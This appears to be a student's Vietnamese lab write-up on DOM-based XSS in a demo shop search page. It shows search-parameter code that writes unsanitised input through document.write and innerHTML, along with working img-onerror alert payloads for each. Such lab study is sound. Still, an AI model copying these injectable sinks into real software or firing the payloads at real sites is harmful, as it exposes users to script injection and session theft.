- Trang web cho chức năng show và tìm sản phẩn trong ô search

## VỚI document.write()

![alt text](image.png)

- Hàm dính lỗi DOM based XSS
<script>
                        function trackSearch(query) {
                            document.write('<img src="https://images.unsplash.com/'+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>

- khi submit form get khi search nếu thì sẽ hiển thị hết quả với ảnh bằng lệnh document.write
 <form action="index.php" method="get" class="flex items-center" id="store-nav-content">

                        <input type="text" class="p-4 bg-gray-200 rounded-xl" name = "search" placeholder="Search for items"/>

                        <button type="submit" class="pl-3 inline-block no-underline hover:text-black">
                            <svg class="fill-current hover:text-black" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                                <path d="M10,18c1.846,0,3.543-0.635,4.897-1.688l4.396,4.396l1.414-1.414l-4.396-4.396C17.365,13.543,18,11.846,18,10 c0-4.411-3.589-8-8-8s-8,3.589-8,8S5.589,18,10,18z M10,4c3.309,0,6,2.691,6,6s-2.691,6-6,6s-6-2.691-6-6S6.691,4,10,4z" />
                            </svg>
                        </button>

                    </form>

- Em sẽ lợi dụng giá trị này để tạo cuộc tấn công DOM based XSS
payload:                              aaaaa"><img src=1 onerror=alert(1)>

- Lúc này khi document.write sẽ tạo ra:   <img src="https://images.unsplash.com/aaaaa><img src=1 onerror=alert(1)>

![alt text](image-2.png)




- Kết quả em nhận được là
 ![alt text](image-1.png)



## Với innerHTML

- Tương tự như trường hợp trên nhưng mà trường hợp này sử dụng inner HTML để hiển thị nội dung
<script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
                        </script>

- và thẻ <span id="searchMessage"></span> khi thực hiện tìm kiếm thì sẽ lấy giá trị tìm kiếm hiển thị ra

payload : aaaaa<img src=1 onerror=alert(1)> thì được kết quả
![alt text](image-3.png)
- Và chúng ta đã XSS thành công ạ